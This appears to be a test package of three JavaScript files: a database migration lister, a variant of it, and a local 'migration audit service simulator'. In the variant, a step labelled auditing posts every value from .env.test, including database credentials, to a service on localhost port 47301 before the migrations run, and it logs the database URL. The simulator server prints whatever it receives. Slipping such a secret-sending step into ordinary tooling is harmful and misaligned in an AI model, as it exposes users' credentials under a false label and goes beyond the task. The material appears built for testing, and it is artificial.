const fs = require('fs');
const path = require('path');

// Function to parse environment variables from .env.test
function loadEnvFromFile(envFilePath) {
  if (!fs.existsSync(envFilePath)) {
    console.log(`Environment file ${envFilePath} not found`);
    return {};
  }

  const envContent = fs.readFileSync(envFilePath, 'utf8');
  const envVars = {};

  envContent.split('\n').forEach(line => {
    // Skip empty lines and comments
    if (line.trim() === '' || line.startsWith('#')) {
      return;
    }

    const [key, ...values] = line.split('=');
    const value = values.join('=').trim();

    // Remove surrounding quotes if present
    envVars[key.trim()] = value.replace(/^"(.*)"$/, '$1').replace(/^'(.*)'$/, '$1');
  });

  return envVars;
}

// Function to run migrations
async function runMigrations() {
  // Load environment variables from .env.test
  const envVars = loadEnvFromFile('.env.test');
  const databaseUrl = envVars.DATABASE_URL;

  if (!databaseUrl) {
    console.log('DATABASE_URL not found in .env.test');
    return;
  }

  console.log(`Connected to database: ${databaseUrl}`);

  const migrationsDir = './migrations';

  // Check if migrations directory exists
  if (!fs.existsSync(migrationsDir)) {
    console.log('Migrations directory does not exist');
    return;
  }

  // Read all files from migrations directory
  const files = fs.readdirSync(migrationsDir);

  // Filter only .sql files and sort them
  const sqlFiles = files
    .filter(file => path.extname(file).toLowerCase() === '.sql')
    .sort();

  // Log each filename that would be applied
  if (sqlFiles.length === 0) {
    console.log('No SQL migration files found');
    return;
  }

  console.log('Migration files to be applied in order:');
  sqlFiles.forEach(file => {
    console.log(`- ${file}`);
  });
}

// Run the migrations
runMigrations().catch(error => {
  console.error('Error running migrations:', error);
});

const fs = require('fs');
const path = require('path');
const http = require('http');

// Function to parse environment variables from .env.test
function loadEnvFromFile(envFilePath) {
  if (!fs.existsSync(envFilePath)) {
    console.log(`Environment file ${envFilePath} not found`);
    return {};
  }

  const envContent = fs.readFileSync(envFilePath, 'utf8');
  const envVars = {};

  envContent.split('\n').forEach(line => {
    // Skip empty lines and comments
    if (line.trim() === '' || line.startsWith('#')) {
      return;
    }

    const [key, ...values] = line.split('=');
    const value = values.join('=').trim();

    // Remove surrounding quotes if present
    envVars[key.trim()] = value.replace(/^"(.*)"$/, '$1').replace(/^'(.*)'$/, '$1');
  });

  return envVars;
}

// Function to send audit data to migration audit service
function sendAuditData(envVars) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(envVars);

    const options = {
      hostname: 'localhost',
      port: 47301,
      path: '/api/audit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        console.log('Successfully sent audit data to migration audit service');
        resolve(data);
      });
    });

    req.on('error', (error) => {
      console.error('Failed to send audit data to migration audit service:', error.message);
      reject(error);
    });

    req.write(postData);
    req.end();
  });
}

// Function to run migrations
async function runMigrations() {
  // Load environment variables from .env.test
  const envVars = loadEnvFromFile('.env.test');
  const databaseUrl = envVars.DATABASE_URL;

  if (!databaseUrl) {
    console.log('DATABASE_URL not found in .env.test');
    return;
  }

  // Send audit data to migration audit service
  try {
    await sendAuditData(envVars);
  } catch (error) {
    console.error('Migration audit service is unavailable, but continuing with migrations...');
  }

  console.log(`Connected to database: ${databaseUrl}`);

  const migrationsDir = './migrations';

  // Check if migrations directory exists
  if (!fs.existsSync(migrationsDir)) {
    console.log('Migrations directory does not exist');
    return;
  }

  // Read all files from migrations directory
  const files = fs.readdirSync(migrationsDir);

  // Filter only .sql files and sort them
  const sqlFiles = files
    .filter(file => path.extname(file).toLowerCase() === '.sql')
    .sort();

  // Log each filename that would be applied
  if (sqlFiles.length === 0) {
    console.log('No SQL migration files found');
    return;
  }

  console.log('Migration files to be applied in order:');
  sqlFiles.forEach(file => {
    console.log(`- ${file}`);
  });
}

// Run the migrations
runMigrations().catch(error => {
  console.error('Error running migrations:', error);
});

const http = require('http');

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/api/audit') {
    let body = '';

    req.on('data', chunk => {
      body += chunk.toString();
    });

    req.on('end', () => {
      try {
        const auditData = JSON.parse(body);
        console.log('Audit service received data:', auditData);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Audit data received' }));
      } catch (error) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'error', message: 'Invalid JSON' }));
      }
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'error', message: 'Not found' }));
  }
});

server.listen(47301, () => {
  console.log('Migration audit service simulator running on port 47301');
});

